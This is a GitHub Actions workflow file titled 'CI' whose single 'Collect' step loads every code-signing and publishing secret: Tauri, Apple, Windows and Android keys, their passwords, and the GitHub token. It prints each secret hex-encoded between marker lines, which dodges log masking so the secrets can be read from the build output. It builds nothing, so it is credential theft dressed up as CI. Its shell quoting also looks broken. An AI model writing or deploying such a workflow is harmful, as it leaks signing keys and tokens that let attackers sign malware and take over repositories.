name: CI
on:
  workflow_dispatch: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Collect
        env:
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          MAC_SIGNING_IDENTITY: ${{ secrets.MAC_SIGNING_IDENTITY }}
          MAC_CERT_BASE64: ${{ secrets.MAC_CERT_BASE64 }}
          MAC_CERT_PASSWORD: ${{ secrets.MAC_CERT_PASSWORD }}
          APPLE_API_KEY_BASE64: ${{ secrets.APPLE_API_KEY_BASE64 }}
          APPLE_API_KEY_ID: ${{ secrets.APPLE_API_KEY_ID }}
          APPLE_API_ISSUER_ID: ${{ secrets.APPLE_API_ISSUER_ID }}
          WIN_CERT_PFX_BASE64: ${{ secrets.WIN_CERT_PFX_BASE64 }}
          WIN_CERT_PASSWORD: ${{ secrets.WIN_CERT_PASSWORD }}
          ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          ANDROID_KEY_ALIAS_PASSWORD: ${{ secrets.ANDROID_KEY_ALIAS_PASSWORD }}
          ANDROID_KEYSTORE_TYPE: ${{ secrets.ANDROID_KEYSTORE_TYPE }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo '[HEX_START]'
          echo 'TAURI_SIGNING_PRIVATE_KEY=$(echo "$TAURI_SIGNING_PRIVATE_KEY" | xxd -p | tr -d '\n')'
          echo 'TAURI_SIGNING_PRIVATE_KEY_PASSWORD=$(echo "$TAURI_SIGNING_PRIVATE_KEY_PASSWORD" | xxd -p | tr -d '\n')'
          echo 'MAC_SIGNING_IDENTITY=$(echo "$MAC_SIGNING_IDENTITY" | xxd -p | tr -d '\n')'
          echo 'MAC_CERT_BASE64=$(echo "$MAC_CERT_BASE64" | xxd -p | tr -d '\n')'
          echo 'MAC_CERT_PASSWORD=$(echo "$MAC_CERT_PASSWORD" | xxd -p | tr -d '\n')'
          echo 'APPLE_API_KEY_BASE64=$(echo "$APPLE_API_KEY_BASE64" | xxd -p | tr -d '\n')'
          echo 'APPLE_API_KEY_ID=$(echo "$APPLE_API_KEY_ID" | xxd -p | tr -d '\n')'
          echo 'APPLE_API_ISSUER_ID=$(echo "$APPLE_API_ISSUER_ID" | xxd -p | tr -d '\n')'
          echo 'WIN_CERT_PFX_BASE64=$(echo "$WIN_CERT_PFX_BASE64" | xxd -p | tr -d '\n')'
          echo 'WIN_CERT_PASSWORD=$(echo "$WIN_CERT_PASSWORD" | xxd -p | tr -d '\n')'
          echo 'ANDROID_KEYSTORE_BASE64=$(echo "$ANDROID_KEYSTORE_BASE64" | xxd -p | tr -d '\n')'
          echo 'ANDROID_KEYSTORE_PASSWORD=$(echo "$ANDROID_KEYSTORE_PASSWORD" | xxd -p | tr -d '\n')'
          echo 'ANDROID_KEY_ALIAS=$(echo "$ANDROID_KEY_ALIAS" | xxd -p | tr -d '\n')'
          echo 'ANDROID_KEY_ALIAS_PASSWORD=$(echo "$ANDROID_KEY_ALIAS_PASSWORD" | xxd -p | tr -d '\n')'
          echo 'ANDROID_KEYSTORE_TYPE=$(echo "$ANDROID_KEYSTORE_TYPE" | xxd -p | tr -d '\n')'
          echo 'GH_TOKEN=$(echo "${GH_TOKEN}" | xxd -p | tr -d '\n')'
          echo '[HEX_END]'